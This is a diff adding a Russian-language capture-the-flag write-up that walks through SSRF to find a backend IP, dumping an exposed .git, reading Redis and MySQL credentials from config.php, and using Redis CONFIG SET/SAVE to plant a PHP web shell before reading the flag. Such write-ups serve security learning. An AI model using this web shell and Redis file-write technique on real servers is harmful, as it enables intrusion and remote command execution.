@@ -428,3 +428,105 @@ https://anonymizer.rosnadzorcom.ru/?page=../../../../../../../opt/aerospike/usr/
 
 ## flag:<font color="red">42e45d5490831c5141617521e74cb536</font>
 
+<br><br>ROPI: Заходим на сайт и видим много пони, сканируем директории и находим /uploads/, /files/, /.git/. К сожалению, при обращении к .git срабатывает аниме-WAF, идем снова на сайт и видим, что там есть возможность загрузки картинок, из основного веб-сайта можно было заметить, что файлы заргуженные в папку /files/ имеют имена равные md5("1"), md5("2") и т.д. пробуем загрузить картинку локально и проверяем /uploads/ на факт присутствия нашего файла, не находим ни name.jpg ни md5("name").jpg. Сайт также предлагает загрузить картинку через юрл, находим картинку любую, загружаем смотрим /uploads/md5().jpg - файл загрузился(ходит но ссылкам)! Однако скрипт отказывается идти по ссылкам которые не заканчиваются на .jpg/.png и т.д. Но это нам не помешает, отправляем ему ссылку на наш сервер с картинкой(она может и не существовать) и смотрим в логах, с какого ip к нам обратились
+{% highlight ruby %}
+connect to [IP] from (UNKNOWN) [128.199.59.83] 43198
+GET /1.jpg HTTP/1.0
+Connection: close
+{% endhighlight %}
+Вот и ip **128.199.59.83**. Идем по этому айпи, обращаясь по нему мы игнорируем WAF, который раньше оказывался посередине. берем  dvcs-ripper и скачиваем сайт через 128.199.59.83/.git/, открываем config.php и видим
+{% highlight ruby %}
+//MySQL
+$mysql['host'] = '127.0.0.1';
+$mysql['user'] = 'ctf';
+$mysql['pass'] = '0b74f17c8b1d6e3b';
+$mysql['base'] = 'ctf';
+
+//Redis
+$redis['host'] = '127.0.0.1';
+$redis['port'] = 6379;
+$redis['pass'] = 'a9e24afea8be7de8';
+{% endhighlight %}
+Сканируем это 2 порта на айпи, оказывается mysql закрыт, а redis нет. Заходим в redis смотрим, что в нем, собственно, ничего кроме имен загруженных файлов там нет. В redis есть неявная возможность записи файла на диск, а если точнее, redis просто сериализует и сохраняет все сеты в форме бекапа, при этом у нас есть возможность задать имя бекапа и директорию, куда его сохранять. К счастью с сериализацией строк все намного проще, но все равно, на всякий случай, делаем flushall сперва
+{% highlight ruby %}
+>FLUSHALL
+>SET foo "<?php system($_GET['cmd']); ?>"
+>CONFIG SET dir /var/www/
+>CONFIG SET dbfilename webshell.php
+>SAVE
+{% endhighlight %}
+В ответ видим что прав писать в /var/www у нас нет, попробуем в /uploads/
+{% highlight ruby %}
+>CONFIG SET dir /var/www/uploads
+>SAVE
+{% endhighlight %}
+Получилось, идем на /uploads/webshell.php и видим, что скрипт не выполнился, видимо работает safe_mode. Меняем пейлоад на то, чтобы вывести список недозволенных функций
+{% highlight ruby %}
+pcntl_alarm is disabled!
+
+pcntl_fork is disabled!
+
+pcntl_waitpid is disabled!
+
+pcntl_wait is disabled!
+
+pcntl_wifexited is disabled!
+
+pcntl_wifstopped is disabled!
+
+pcntl_wifsignaled is disabled!
+
+pcntl_wexitstatus is disabled!
+
+pcntl_wtermsig is disabled!
+
+pcntl_wstopsig is disabled!
+
+pcntl_signal is disabled!
+
+pcntl_signal_dispatch is disabled!
+
+pcntl_get_last_error is disabled!
+
+pcntl_strerror is disabled!
+
+pcntl_sigprocmask is disabled!
+
+pcntl_sigwaitinfo is disabled!
+
+pcntl_sigtimedwait is disabled!
+
+pcntl_exec is disabled!
+
+pcntl_getpriority is disabled!
+
+pcntl_setpriority is disabled!
+
+exec is disabled!
+
+passthru is disabled!
+
+shell_exec is disabled!
+
+system is disabled!
+
+proc_open is disabled!
+
+popen is disabled!
+
+curl_exec is disabled!
+
+curl_multi_exec is disabled!
+
+parse_ini_file is disabled!
+
+show_source is disabled!
+{% endhighlight %}
+Все что может дать нам RCE - запрещено, однако мы все еще спокойно можем читать файлы и директории при помощи функций php. Пишем пейлоад с readfile() и scandir() и читаем в / файл с флагом
+
+## PWND!
+
+## flag:<font color="red">5d710ac04a2eb6af5682fd92577b3e01</font>
+
+
+
